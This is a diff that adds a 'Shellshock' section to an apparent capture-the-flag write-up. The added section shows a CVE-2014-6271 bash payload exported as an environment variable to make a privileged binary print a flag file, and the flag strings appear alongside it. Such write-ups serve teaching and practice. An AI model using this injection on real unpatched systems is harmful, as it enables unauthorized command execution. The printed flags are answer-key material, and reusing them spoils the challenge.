@@ -232,3 +232,13 @@ Password OK
 ![screenshot_20180713_145429](https://user-images.githubusercontent.com/22657154/42693293-5e9a7f5a-86b7-11e8-9bfa-5e3d4e0da3ed.png)
 
 ```Flag : Mommy, the operator priority always confuses me :(```
+
+# Shellshock 
+
+```assembly
+shellshock@ubuntu:~$ export exploit_it="() { :; }; /bin/cat flag;"
+shellshock@ubuntu:~$ ./shellshock 
+only if I knew CVE-2014-6271 ten years ago..!!
+```
+
+``` Flag : only if I knew CVE-2014-6271 ten years ago..!! ```
